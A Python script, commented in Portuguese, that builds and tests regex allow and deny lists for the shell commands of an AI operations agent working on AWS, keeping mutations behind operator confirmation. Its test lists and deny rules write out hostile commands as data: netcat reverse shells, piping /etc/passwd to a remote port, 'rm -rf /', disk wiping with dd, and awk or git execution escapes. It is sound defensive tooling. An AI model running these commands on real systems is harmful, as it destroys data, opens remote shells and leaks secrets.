#!/usr/bin/env python3
"""
Gerador do allowlist/denylist de shell do agente NOC (~/.kiro/agents/noc-aws.json).

Modelo de 3 camadas:
  1. AUTO    -> allowedCommands: comandos de leitura, executados sem confirmação.
  2. PROMPT  -> tudo que não casa com nada: exige confirmação explícita do operador.
  3. DENY    -> deniedCommands: bloqueio duro (vence AUTO, verificado empiricamente).

Regras de construção (o motor de regex do Kiro é Rust `regex`: NÃO suporta lookahead):
  - Cada segmento de comando só aceita argumentos SEM metacaracteres de shell
    (`; & | > < $ backtick`), o que impede encadear mutação depois de um comando de leitura.
  - Encadeamento é liberado apenas entre segmentos que já são de leitura (pipeline pattern).
  - Riscos residuais de ferramentas de leitura (find -delete, journalctl --vacuum,
    curl -d, sort -o, awk system()) são cortados na camada DENY.

Uso:
    python3 generate_allowlist.py                 # roda os testes e aplica no agente
    python3 generate_allowlist.py --check         # só roda os testes, não escreve
    python3 generate_allowlist.py --agent CAMINHO # aplica em outro arquivo de agente
"""
import json
import re
import sys
from pathlib import Path

DEFAULT_AGENT = Path.home() / ".kiro/agents/noc-guard.json"


def agent_path(argv=None) -> Path:
    """Caminho do agente: --agent CAMINHO, senao ~/.kiro/agents/noc-guard.json."""
    argv = list(sys.argv[1:] if argv is None else argv)
    if "--agent" in argv:
        i = argv.index("--agent")
        if i + 1 >= len(argv):
            sys.exit("erro: --agent exige um caminho")
        return Path(argv[i + 1]).expanduser()
    return DEFAULT_AGENT

# Argumentos sem metacaracteres de shell (bloqueia ; && || | > < backtick e newline).
# `$` é permitido (necessário para awk '{print $7}'); `$(` cai no DENY.
A = r"[^;&|><`\n]*"
# Sufixo opcional de redirecionamento de stderr/stdout (comum em triagem).
# Aceita SOMENTE descartes para o "buraco negro" (/dev/null no Unix, NUL no
# Windows) ou 2>&1 (merge stderr->stdout). NUNCA um caminho de arquivo real:
# a ausência de qualquer alternativa "arquivo" aqui é o que impede escrita em
# disco por este canal (`> arquivo.txt` continua fora de A, cai em PROMPT).
_NULL = r"(?:/dev/null|NUL|nul)"
_DISCARD = rf"(?:[012]?>>?\s*{_NULL}|&>\s*{_NULL}|<\s*{_NULL}|2>&1|\|\s*Out-Null)"
R = rf"(?:\s+{_DISCARD}){{0,4}}"


def seg(prefix: str) -> str:
    """Segmento = comando + argumentos seguros + redirecionamentos de descarte opcionais."""
    return prefix + r"(?:\s+" + A + r")?" + R


def lit(cmd: str) -> str:
    """Escapa um comando literal (possivelmente com espaços) para regex,
    sem o bug de re.escape(...).replace(' ', r'\\s+') (que corrompe o escape
    de espaço em Python 3.7+, pois re.escape já emite '\\ ' para espaço)."""
    return r"\s+".join(re.escape(part) for part in cmd.split(" "))


# ---------------------------------------------------------------- leitura local
SEGMENTS: list[str] = []
TEXT = ("cat", "zcat", "bzcat", "xzcat", "zgrep", "zegrep", "zdiff", "grep", "egrep",
        "fgrep", "rg", "tail", "head", "wc", "sort", "uniq", "cut", "tr", "nl",
        "column", "paste", "join", "comm", "diff", "jq", "yq", "awk", "less", "more",
        "strings", "base64", "md5sum", "sha256sum", "xxd", "od", "findstr", "Select-String",
        "sls", "Get-Content", "Measure-Object", "Sort-Object", "Get-Unique", "Select-Object",
        "select", "Format-Table", "ft", "Format-List", "fl", "Out-String", "Compare-Object", "type")
FS = ("ls", "ll", "dir", "stat", "file", "readlink", "realpath", "basename", "dirname",
      "tree", "du", "df", "mount", "lsblk", "findmnt", "find",
      "Get-ChildItem", "gci", "Get-Item", "Get-ItemProperty", "Test-Path", "Resolve-Path",
      "Get-Volume", "Get-Disk", "pwd", "Get-Location")
SYS = ("uptime", "date", "whoami", "id", "hostname", "uname", "lscpu", "nproc",
       "free", "vmstat", "iostat", "mpstat", "sar", "dmesg", "last", "w", "who",
       "printenv", "echo", "which", "where", "type", "command -v", "sleep",
       "Get-Date", "systeminfo", "Get-ComputerInfo", "Get-WmiObject", "gwmi", "Get-CimInstance",
       "Write-Output", "Get-Command", "gcm", "Start-Sleep")
PROC = ("ps", "pgrep", "pidof", "lsof", "ss", "netstat", "iotop -b", "top -b", "pstree",
        "tasklist", "Get-Process", "gps", "Get-NetTCPConnection", "Get-NetUDPEndpoint")
NET = ("dig", "nslookup", "host", "getent", "traceroute", "traceroute6", "tracepath", "whois",
       "openssl x509", "wget --spider", "mtr",
       "Test-NetConnection", "tnc", "tracert", "Resolve-DnsName", "ipconfig",
       "Get-NetIPAddress", "Get-NetAdapter", "arp", "route print")
# ip / ifconfig: apenas subcomandos de leitura, com verbo de leitura EXPLÍCITO
# e fechado (nunca aceita "add/del/set/change/flush/replace" etc, que mutam
# rotas/interfaces). Cada objeto só casa com "show" (ou a forma abreviada
# padrão do iproute2, que sem verbo também lista) — nunca com argumentos livres
# que permitiriam completar "addr add ...".
IP_OBJ = r"(?:a(?:ddr(?:ess)?)?|l(?:ink)?|r(?:oute)?|neigh(?:bour)?|ru(?:le)?|maddr|tunnel|-s\s+link)"
# Forma "ip <obj> show [filtros]": aceita filtros de leitura (dev/to/scope) via
# a classe A restrita, mas apenas depois do verbo "show" já fixado no literal.
SEGMENTS.append(seg(rf"ip\s+{IP_OBJ}\s+show(?:\s+(?:dev|to|scope)\s+[\w./]+)*"))
# Forma "ip <obj>" (sem verbo): iproute2 usa "show" como padrão implícito.
# Aqui NÃO usamos seg() pois isso anexaria argumentos livres (que permitiriam
# "ip addr add ..."); o segmento é fechado, só com redirect de descarte opcional.
SEGMENTS.append(rf"ip\s+{IP_OBJ}{R}")
SEGMENTS.append(rf"ip\s+-\d+\s+{IP_OBJ}{R}")
# ifconfig: sem argumento (lista todas as interfaces) ou só com um nome de
# interface (mostra uma interface) é leitura pura. Não usamos seg() aqui:
# ele anexaria argumentos livres depois do nome da interface, permitindo
# "ifconfig eth0 down/up/netmask/...". O segmento é fechado, só com o nome
# da interface e redirect de descarte opcional.
SEGMENTS.append(rf"ifconfig{R}")
SEGMENTS.append(rf"ifconfig\s+[\w.:-]+{R}")

# nc como probe de porta: exige uma flag -z (scan sem enviar dados, pode estar
# combinada com -v/-4/-6, ex.: -zv, -vz, -46z) em ALGUMA posição da sequência
# de flags, com -v/-4/-6/-w N soltos permitidos antes/depois. A classe de
# letras é FECHADA (só z,v,4,6) para impedir combinar com flags perigosas
# como -e (executar programa) ou -l (listen). Segmento FECHADO (sem seg()):
# impede anexar "-e /bin/sh" depois do host:porta via a classe A genérica.
NC_SIDEFLAG = r"(?:-[v46]+|-w\s+\d+)"
NC_ZFLAG = r"-[v46]*z[v46]*w?\d*"
NC_HOSTPORT = r"[\w.\-]+\s+\d+"
SEGMENTS.append(
    rf"nc\s+(?:{NC_SIDEFLAG}\s+)*{NC_ZFLAG}\s+(?:{NC_SIDEFLAG}\s+)*{NC_HOSTPORT}{R}"
)

# openssl s_client: usado para inspecionar certificados/handshake TLS. Segmento
# FECHADO (sem seg()/classe A genérica no final): só aceita a whitelist restrita
# de flags de leitura abaixo, repetidas em qualquer ordem — isso impede anexar
# flags de escrita em disco (ex.: -sess_out arquivo.pem) ou qualquer flag fora
# da lista, que cairiam em PROMPT por não haver mais nenhum "resto livre".
SSL_CLIENT_FLAG = (r"(?:-connect\s+[\w.\-:]+|-servername\s+[\w.\-]+|-showcerts|-quiet|"
                   r"-brief|-verify\s+\d+|-verify_return_error|-tls1_2|-tls1_3|-no_ign_eof|"
                   r"-status|-ign_eof|-crlf|-starttls\s+\w+|-alpn\s+[\w,\-]+)")
SEGMENTS.append(rf"openssl\s+s_client(?:\s+{SSL_CLIENT_FLAG})*{R}")

for c in TEXT + FS + SYS + PROC + NET:
    SEGMENTS.append(seg(lit(c)))

# ping só na forma limitada (-c N), para não travar a sessão
SEGMENTS.append(seg(r"ping\s+-c\s+\d+"))

# curl: apenas flags de leitura em allowlist explícito (sem lookahead no regex Rust).
# -X/--request, -d/--data, -F/--form, -T/--upload-file, -o/-O ficam de fora => PROMPT.
_Q = r"(?:\"[^\"]*\"|'[^']*'|\S+)"
CURL_FLAG = (r"(?:-[sSLkvig#46]+|-o-|(?:-o|--output)\s+(?:\"?(?:/dev/null|NUL|nul)\"?|'(?:/dev/null|NUL|nul)')|"
             r"--silent|--show-error|--location|--insecure|--ssl-no-revoke|"
             r"--compressed|--fail|--fail-with-body|--head|-I|--no-progress-meter|"
             r"--http1\.1|--http2|--tlsv1\.2|--retry\s+\d+|-m\s+\d+|"
             r"--max-time\s+\d+|--connect-timeout\s+\d+|"
             rf"(?:-H|--header|-A|--user-agent|-b|--cookie|-u|--user|-w|--write-out|"
             rf"--resolve|--cacert|--cert|--key|-e|--referer)\s+{_Q})")
CURL_URL = r"(?:'https?://[^'\s]*'|\"https?://[^\"\s]*\"|https?://[^\s]*)"
SEGMENTS.append(seg(rf"curl(?:\s+{CURL_FLAG})*\s+{CURL_URL}(?:\s+{CURL_FLAG})*"))

# ------------------------------------------------------------- serviços / infra
SEGMENTS.append(seg(r"systemctl\s+(?:status|is-active|is-enabled|is-failed|"
                    r"list-units|list-unit-files|list-timers|list-sockets|show|cat)"))
SEGMENTS.append(seg(r"journalctl"))            # --vacuum/--rotate/--flush caem no DENY
SEGMENTS.append(seg(r"docker\s+(?:ps|logs|inspect|stats|images|version|info|top|"
                    r"port|diff|history|events)"))
# kubectl: whitelist FECHADA de flags globais de leitura permitidas ANTES do
# subcomando (nunca wildcard). Isso preserva a garantia read-only: um subcomando
# de mutação (delete/exec/apply/patch/scale/drain/rollout/edit/cp/attach/
# port-forward/...) NÃO casa, pois só os subcomandos de leitura são aceitos
# na posição do verbo, e antes dele só entram flags conhecidas.
_KV = r"(?:\"[^\"]*\"|'[^']*'|[^\s;&|><`]+)"   # valor de flag sem metacaracteres
KUBECTL_GFLAG = (
    r"(?:"
    r"(?:--context|--namespace|-n|--kubeconfig|--cluster|--user|--as|"
    rf"--as-group|-s|--server|--token|--tls-server-name|--cache-dir|--request-timeout)\s+{_KV}"
    r"|--insecure-skip-tls-verify"
    r")"
)
KUBECTL_READ = (r"(?:get|describe|logs|top|version|explain|api-resources|"
                r"api-versions|cluster-info|config\s+view|config\s+get-contexts|config\s+current-context)")
SEGMENTS.append(seg(rf"kubectl(?:\s+{KUBECTL_GFLAG})*\s+{KUBECTL_READ}"))
SEGMENTS.append(seg(r"crontab\s+-l"))
SEGMENTS.append(seg(r"nginx\s+-[tTV]"))
SEGMENTS.append(seg(r"apachectl\s+configtest"))

# ----------------------------------------------------------------- git (leitura)
SEGMENTS.append(seg(r"git\s+(?:status|log|diff|show|blame|shortlog|whatchanged|"
                    r"reflog|rev-parse|describe|ls-files|ls-tree|cat-file|"
                    r"count-objects|verify-commit)"))
SEGMENTS.append(seg(r"git\s+branch(?:\s+(?:-a|-r|-v|-vv|--list|--show-current|--merged))*"))
SEGMENTS.append(seg(r"git\s+tag\s+-l"))
SEGMENTS.append(seg(r"git\s+remote\s+-v"))
SEGMENTS.append(seg(r"git\s+config\s+--get"))

# --------------------------------------------------- skill de cloudtrail
SEGMENTS.append(seg(r"python3\s+\S*cloudtrail-search/search_trail\.py"))

# --------------------------------------------------- skill de knowledge base
SEGMENTS.append(seg(r"python3\s+\S*knowledge-builder/kb_manager\.py"))

# ------------------------------------------------------------- AWS CLI (leitura)
# Verbos de leitura. Mutações (create/delete/put/update/modify/terminate/
# start/stop/reboot/...) ficam de fora => caem em PROMPT.
READ_VERBS = (r"describe|get|list|search|lookup|filter|batch-get|head|test|validate|"
              r"check|preview|estimate|simulate|generate-credential-report|"
              r"select|query|scan|sample|view|export-to|count")
SEGMENTS.append(seg(rf"aws\s+[\w-]+\s+(?:{READ_VERBS})-[\w-]+"))
SEGMENTS.append(seg(r"aws\s+logs\s+tail"))
# start-query/stop-query: iniciam/encerram uma consulta do CloudWatch Logs Insights.
# Não mutam infraestrutura nem dados => liberados para triagem.
SEGMENTS.append(seg(r"aws\s+logs\s+(?:start-query|stop-query)"))
# update-kubeconfig: grava apenas no kubeconfig local (~/.kube/config), sem
# mutação de infraestrutura => liberado para permitir acesso de leitura ao cluster.
SEGMENTS.append(seg(r"aws\s+eks\s+update-kubeconfig"))
SEGMENTS.append(seg(r"aws\s+dynamodb\s+query"))
SEGMENTS.append(seg(r"aws\s+s3\s+ls"))
SEGMENTS.append(seg(r"aws\s+s3api\s+(?:list|get|head)-[\w-]+"))
SEGMENTS.append(seg(r"aws\s+sts\s+(?:get-caller-identity|decode-authorization-message)"))
SEGMENTS.append(seg(r"aws\s+configure\s+(?:list|list-profiles)"))
SEGMENTS.append(seg(r"aws\s+ecs\s+(?:describe|list)-[\w-]+"))
SEGMENTS.append(seg(r"aws\s+(?:--version|help)"))

# ------------------------------------------------ encadeamento entre leituras
ALT = "(?:" + "|".join(f"(?:{s})" for s in SEGMENTS) + ")"
SEP = r"(?:\s*\|\s*|\s*&&\s*|\s*;\s*|\s*\|\|\s*)"
CHAIN = rf"^{ALT}(?:{SEP}{ALT})+\s*;?$"

ALLOWED = [f"^{s}$" for s in SEGMENTS] + [CHAIN]

# ------------------------------------------------------------------ camada DENY
SYSDIRS = r"(?:bin|boot|dev|etc|home|lib|lib64|opt|proc|root|sbin|srv|sys|usr|var)"
DENY_CORE = [
    # remoção recursiva em raiz / diretórios de sistema / home. Aceita um
    # redirect de descarte opcional no final (2>/dev/null etc — o mesmo
    # conjunto liberado para comandos de leitura em R) para que operadores
    # não consigam escapar do DENY só "sujando" o comando com esse sufixo.
    rf"rm\s+(?:-[a-zA-Z]+\s+)*-?[a-zA-Z]*[rR][a-zA-Z]*\s+(?:/|/{SYSDIRS}/?|~/?|\$HOME/?){R}\s*$",
    r"rm\s+(?:-[a-zA-Z]+\s+)*--no-preserve-root",
    # destruição de disco / filesystem
    r"mkfs(?:\.\w+)?\s",
    r"dd\s+[^\n]*of=/dev/",
    r">\s*/dev/(?:sd|nvme|vd|xvd)",
    r"(?:wipefs|shred|fdisk|parted|sgdisk)\s",
    # desligar/reiniciar a máquina local
    r"(?:sudo\s+)?(?:shutdown|reboot|poweroff|halt)\b",
    r"(?:sudo\s+)?(?:init|telinit)\s+[06]\b",
    # fork bomb
    r":\(\)\s*\{",
    # permissões em massa
    rf"(?:chmod|chown|chgrp)\s+[^\n]*-R[^\n]*\s(?:/|/{SYSDIRS})\b",
    # apagar histórico/logs do sistema
    r"journalctl[^\n]*--(?:vacuum|rotate|flush|sync)",
    r"truncate\s+[^\n]*/var/log",
    # escapes de ferramentas de leitura
    r"find\s+[^\n]*-(?:delete|exec|execdir|ok|okdir|fprint|fprintf|fls)\b",
    r"awk\s+[^\n]*(?:system\s*\(|-f\b|getline|\|\s*\"|\>\s*\")",
    r"xxd\s+[^;&|><\n]*-r\b",
    r"git\s+[^;&|><\n]*--(?:ext-cmd|ext-diff|exec-path|upload-pack)\b",
    r"(?:sort|jq)\s+[^\n]*(?:\s-o\s|--output[\s=])",
]

# Regras que valem em qualquer posição do comando (não dependem de prefixo)
DENY_ANYWHERE = [
    r"\$\(",   # substituição de comando
    r"`",      # substituição de comando (crase)
    r"<\(",    # process substitution
]

# Cada regra vale no início do comando e também depois de um separador de shell,
# com ou sem caminho absoluto (/bin/rm) e com ou sem sudo.
DENY = []
_PFX = r"(?:sudo\s+)?(?:/\S*/)?"
for rule in DENY_CORE:
    DENY.append(rf"^\s*{_PFX}{rule}[^\n]*$")
    DENY.append(rf"^[^\n]*[;&|]\s*{_PFX}{rule}[^\n]*$")
for rule in DENY_ANYWHERE:
    DENY.append(rf"^[^\n]*{rule}[^\n]*$")

# =============================================================== testes offline
AUTO = [
    "cat /var/log/syslog",
    "zgrep -c ERROR /var/log/app.log.1.gz",
    "tail -n 500 -f /var/log/nginx/error.log",
    "grep -i 'timeout' app.log | wc -l",
    "cat access.log | grep ' 500 ' | awk '{print $7}' | sort | uniq -c | sort -rn | head -20",
    "jq '.Events[].message' /tmp/logs.json",
    "ls -la /var/log; df -h; free -m",
    "find /var/log -name '*.gz' -mtime -2 -type f",
    "journalctl -u nginx -n 200 --no-pager",
    "systemctl status nginx",
    "docker logs --tail 100 api",
    "kubectl get pods -A",
    "kubectl --context exemplo-prod -n minha-app get pod app-worker-0000000000-xxxxx -o wide",
    "kubectl -n minha-app describe pod app-worker-0000000000-xxxxx",
    "kubectl --namespace minha-app logs app-worker-0000000000-xxxxx --previous",
    "kubectl --kubeconfig ~/.kube/config --context exemplo-prod get events -n minha-app",
    "kubectl --context exemplo-prod top pod -n minha-app",
    "kubectl -n kube-system get pods | grep fluent",
    "aws eks update-kubeconfig --name meu-cluster-eks --region us-east-1 --profile EXAMPLE-PROD-NOC --alias exemplo-prod",
    "aws logs start-query --log-group-name /x --query-string 'fields @message' --start-time 1700000000 --end-time 1700003600 --profile EXAMPLE-NOC",
    "aws logs stop-query --query-id abc123 --profile EXAMPLE-NOC",
    "git status --short && git log --oneline -5",
    "curl -s -o- https://example.com/health",
    "curl -v -o /dev/null -sS --connect-timeout 10 --max-time 20 https://roadcard.com.br/ 2>&1",
    "echo \"=== HTTPS check with timing ===\"; curl -v -o /dev/null -sS --connect-timeout 10 --max-time 20 https://roadcard.com.br/ 2>&1; echo \"EXIT_CODE=$?\"",
    "curl -sS -m 5 -H 'Accept: application/json' https://api.example.com/status",
    "ping -c 3 8.8.8.8",
    "dig +short api.example.com",
    "ss -tnp",
    "python3 ~/.kiro/skills/cloudtrail-search/search_trail.py --profile PROD --since 1h",
    "python3 ~/.kiro/noc-guard/skills/knowledge-builder/kb_manager.py --bucket my-bucket --action search --query timeout",
    "aws logs filter-log-events --log-group-name /aws/lambda/f --start-time 1700000000 --profile EXAMPLE-NOC --output json",
    "aws logs tail /aws/lambda/f --since 1h --profile EXAMPLE-NOC",
    "aws logs describe-log-groups --profile EXAMPLE-NOC --output table",
    "aws logs get-query-results --query-id abc --profile EXAMPLE-NOC",
    "aws cloudwatch get-metric-data --cli-input-json file://q.json --profile EXAMPLE-NOC",
    "aws cloudwatch get-metric-statistics --namespace AWS/RDS --start-time 2026-09-01T00:00:00Z --profile EXAMPLE-NOC",
    "aws cloudwatch describe-alarms --state-value ALARM --profile EXAMPLE-NOC --output json",
    "aws ec2 describe-instances --filters Name=instance-state-name,Values=running --profile EXAMPLE-NOC",
    "aws rds describe-db-instances --profile EXAMPLE-NOC",
    "aws iam list-users --profile EXAMPLE-NOC",
    "aws ssm get-parameters --names /app/db --profile EXAMPLE-NOC",
    "aws s3 ls s3://bucket/prefix/ --profile EXAMPLE-NOC",
    "aws s3api head-object --bucket b --key k --profile EXAMPLE-NOC",
    "aws sts get-caller-identity --profile EXAMPLE-NOC",
    "aws ce get-cost-and-usage --time-period Start=2026-09-01,End=2026-09-22 --profile EXAMPLE-NOC",
    "Get-ChildItem -Path C:\\logs | Select-String -Pattern 'error'",
    "ipconfig /all | findstr DNS",
    "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10",
    "aws cloudtrail lookup-events --max-results 10 --profile EXAMPLE-NOC",
    "aws dynamodb query --table-name t --key-condition-expression 'pk = :p' --profile EXAMPLE-NOC",
    "aws ecs describe-services --cluster c --services s --profile EXAMPLE-NOC",
    "aws logs describe-log-streams --log-group-name /x --profile EXAMPLE-NOC | jq '.logStreams[0]'",
    # --- diagnósticos de rede/SSL comuns em NOC (SiteDown/DNS/SSL) ---
    "curl -v -o /dev/null -sS --connect-timeout 10 --max-time 20 https://roadcard.com.br/ 2>/dev/null",
    "openssl s_client -connect example.com:443 -servername example.com </dev/null 2>/dev/null",
    "openssl x509 -in cert.pem -noout -dates",
    "openssl x509 -noout -dates -in cert.pem",
    "mtr -rw -c 4 8.8.8.8",
    "mtr -n -c 5 -r 8.8.8.8",
    "ip a",
    "ip addr",
    "ip addr show",
    "ip -4 addr",
    "ip r",
    "ip route",
    "ip route show",
    "ip link",
    "ip link show",
    "ip neigh",
    "ip neigh show",
    "ifconfig",
    "ifconfig eth0",
    "nc -zv example.com 443",
    "nc -zvw3 example.com 443",
    "nc -z -v example.com 443",
    "nc -z example.com 443",
    "nc -v -z example.com 443",
    "nc -46zv example.com 443",
    "nc -z -w 5 example.com 443",
    "command -v curl",
    "top -b -n 1",
    "iotop -b -n 1",
    # --- redirecionamentos de descarte em comandos já permitidos ---
    "netstat -tuln 2>/dev/null",
    "ss -tnp 2>/dev/null",
    "ls -la 2>/dev/null",
    "cat /etc/hosts 2>/dev/null",
    "curl -s https://example.com > /dev/null",
    "curl -s https://example.com < /dev/null",
    "dig +short example.com 2>/dev/null",
    "curl -s https://x 2>/dev/null | jq .status",
    "cat /var/log/app.log 2>/dev/null | grep ERROR",
    "ip a && ip r",
    "ifconfig | grep eth0",
    "openssl s_client -connect x:443 2>/dev/null | openssl x509 -noout -dates",
]
PROMPT = [
    "rm /tmp/file.txt",
    "rm -rf ./build",
    "touch /tmp/novo",
    "mkdir /tmp/x",
    "cp a b",
    "mv a b",
    "sed -i 's/a/b/' file",
    "echo 'x' > /etc/hosts",
    "cat template.conf > /etc/nginx/nginx.conf",
    "cat /tmp/a && rm -f /tmp/b",
    "cat /tmp/a; rm -f /tmp/b",
    "cat /tmp/a | sh",
    "grep x f.log && systemctl restart nginx",
    "systemctl restart nginx",
    "systemctl stop nginx",
    "docker restart api",
    "kubectl delete pod x",
    "kubectl rollout restart deploy/api",
    "kubectl -n minha-app delete pod app-worker-0000000000-xxxxx",
    "kubectl --context exemplo-prod -n minha-app delete pod x",
    "kubectl --namespace minha-app rollout restart deploy/minha-app-worker",
    "kubectl -n minha-app exec -it minha-app-worker -- sh",
    "kubectl --context exemplo-prod exec pod -- bash",
    "kubectl -n x apply -f manifest.yaml",
    "kubectl --namespace x patch deploy api -p '{}'",
    "kubectl -n x scale deploy/api --replicas 0",
    "kubectl --context c drain node-1",
    "kubectl -n x edit configmap cm",
    "kubectl -n x cp pod:/a /tmp/a",
    "kubectl -n x port-forward pod 8080:80",
    "kubectl --namespace x delete job get-metrics",
    "git checkout main",
    "git commit -m x",
    "git push origin main",
    "aws ec2 terminate-instances --instance-ids i-1 --profile EXAMPLE",
    "aws ec2 stop-instances --instance-ids i-1 --profile EXAMPLE",
    "aws ec2 start-instances --instance-ids i-1 --profile EXAMPLE",
    "aws ec2 reboot-instances --instance-ids i-1 --profile EXAMPLE",
    "aws ec2 create-tags --resources i-1 --tags Key=k,Value=v --profile EXAMPLE",
    "aws ec2 delete-security-group --group-id sg-1 --profile EXAMPLE",
    "aws ec2 modify-instance-attribute --instance-id i-1 --profile EXAMPLE",
    "aws rds modify-db-instance --db-instance-identifier x --profile EXAMPLE",
    "aws rds reboot-db-instance --db-instance-identifier x --profile EXAMPLE",
    "aws rds delete-db-instance --db-instance-identifier x --profile EXAMPLE",
    "aws ssm put-parameter --name /x --value y --profile EXAMPLE",
    "aws ssm send-command --document-name AWS-RunShellScript --profile EXAMPLE",
    "aws logs delete-log-group --log-group-name /x --profile EXAMPLE",
    "aws logs put-retention-policy --log-group-name /x --retention-in-days 1 --profile EXAMPLE",
    "aws cloudwatch put-metric-alarm --alarm-name a --profile EXAMPLE",
    "aws cloudwatch delete-alarms --alarm-names a --profile EXAMPLE",
    "aws iam update-user --user-name x --profile EXAMPLE",
    "aws iam attach-role-policy --role-name r --policy-arn a --profile EXAMPLE",
    "aws s3 cp local.txt s3://b/k --profile EXAMPLE",
    "aws s3 rm s3://b/k --profile EXAMPLE",
    "aws s3 sync . s3://b --profile EXAMPLE",
    "aws lambda update-function-code --function-name f --profile EXAMPLE",
    "aws ecs update-service --cluster c --service s --desired-count 0 --profile EXAMPLE",
    "curl -X POST https://api.example.com/deploy",
    "curl -d 'a=1' https://api.example.com/x",
    "curl -o /tmp/f.bin https://example.com/f.bin",
    "wget https://example.com/f.bin",
    # tentativas de contorno: tudo deve cair em confirmação
    "aws ec2 describe-instances --profile EXAMPLE; aws ec2 terminate-instances --instance-ids i-1",
    "find /var/log -name '*.log' | xargs rm -f",
    "bash -c 'rm -rf /tmp/x'",
    "sh -c 'curl -X POST https://x'",
    "docker exec -it api sh",
    "kubectl exec -it pod -- sh",
    "aws configure set region us-east-2",
    "aws ssm start-session --target i-1 --profile EXAMPLE",
    "tee /etc/hosts",
    "ls -la && touch /tmp/probe",
    "FOO=bar rm -rf /tmp/x",
    "> /var/log/syslog",
    "dd if=/dev/sda of=/tmp/disk.img",
    # --- garantias sobre as novas liberações: nunca mutação, mesmo com descarte ---
    "openssl s_client -connect x:443 -quiet -sess_out /tmp/session.pem",
    "openssl s_client -connect x:443 foo -CApath /tmp",
    "nc -z example.com 4444 -e /bin/sh",
    "nc -ez /bin/sh example.com 4444",
    "nc -lz -p 4444",
    "nc example.com 4444",
    "nc -v example.com 4444",
    "nc example.com 4444 < /etc/passwd",
    "ip addr add 10.0.0.1/24 dev eth0",
    "ip link set eth0 down",
    "ip route add default via 10.0.0.1",
    "ip route del default",
    "ip neigh flush all",
    "ip addr flush dev eth0",
    "ifconfig eth0 down",
    "ifconfig eth0 up",
    "ifconfig eth0 10.0.0.5 netmask 255.255.255.0",
    "mtr --report -c 1 8.8.8.8 > /tmp/out.txt",
    "curl -s https://example.com > /tmp/out.txt",
    "curl -s https://example.com >> /var/log/app.log",
    "cat a 2>/dev/null > file.txt",
    "echo x 2>/dev/null > /etc/hosts",
    "rm -rf /tmp/x 2>/dev/null",
    "ip a && ip addr add 10.0.0.1/24 dev eth0",
    "nc -zv example.com 443 && rm -rf /tmp/x",
    "ifconfig eth0 down && ip a",
]
DENY_T = [
    "rm -rf /",
    "rm -rf /etc",
    "rm -rf ~",
    "sudo rm -rf --no-preserve-root /",
    "/bin/rm -rf /usr",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/sda bs=1M",
    "shred -n 3 /dev/sdb",
    "sudo shutdown -h now",
    "reboot",
    "sudo init 0",
    "chmod -R 777 /etc",
    "journalctl --vacuum-time=1s",
    "journalctl --vacuum-size=1M",
    "truncate -s 0 /var/log/syslog",
    "find /var/log -name '*.log' -delete",
    "find /tmp -name x -exec rm {} ;",
    "awk 'BEGIN{system(\"rm -rf /tmp/x\")}'",
    "cat /tmp/a && rm -rf /",
    "ls /tmp; sudo shutdown -h now",
    "cat /tmp/a $(rm -rf /tmp/b)",
    "grep x `rm -rf /tmp/y`",
    "awk 'BEGIN { print \"rm -rf /\" | \"/bin/sh\" }'",
    "awk 'BEGIN { \"/bin/id\" | getline out; print out }'",
    "awk -f /tmp/malicious.awk",
    "xxd -r -p hex.txt /bin/bash",
    "git log --ext-diff",
    "git diff --ext-cmd=rm",
    # --- garantias DENY mesmo com sufixo de descarte agora aceito em R ---
    "rm -rf / 2>/dev/null",
    "rm -rf / 2>&1",
    "sudo rm -rf --no-preserve-root / 2>/dev/null",
    "cat /tmp/a 2>/dev/null && rm -rf /",
    "dd if=/dev/zero of=/dev/sda bs=1M 2>/dev/null",
]


def classify(cmd, allowed, denied):
    if any(r.search(cmd) for r in denied):
        return "DENY"
    if any(r.search(cmd) for r in allowed):
        return "AUTO"
    return "PROMPT"


def run_tests():
    allowed = [re.compile(p) for p in ALLOWED]
    denied = [re.compile(p) for p in DENY]
    fails = 0
    for group, expected in ((AUTO, "AUTO"), (PROMPT, "PROMPT"), (DENY_T, "DENY")):
        for cmd in group:
            got = classify(cmd, allowed, denied)
            if got != expected:
                fails += 1
                print(f"FAIL  expected={expected:6} got={got:6} | {cmd}")
    total = len(AUTO) + len(PROMPT) + len(DENY_T)
    print(f"tests: {total}  fails: {fails}  "
          f"(patterns: {len(ALLOWED)} allow / {len(DENY)} deny)")
    return fails == 0


def apply_to_agent(agent: Path):
    if not agent.is_file():
        sys.exit(f"error: agent not found at {agent}\n"
                 f"install the template first (see install.sh) or use --agent PATH")
    cfg = json.loads(agent.read_text(encoding="utf-8"))
    shell = cfg.setdefault("toolsSettings", {}).setdefault("shell", {})
    shell["allowedCommands"] = ALLOWED
    shell["deniedCommands"] = DENY
    shell["autoAllowReadonly"] = False   # explicit allowlist is the single source of truth
    shell["denyByDefault"] = False       # unlisted => prompts for confirmation (does not block)
    agent.write_text(json.dumps(cfg, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    print(f"applied to {agent}")


if __name__ == "__main__":
    ok = run_tests()
    if not ok:
        sys.exit(1)
    if "--check" not in sys.argv:
        apply_to_agent(agent_path())
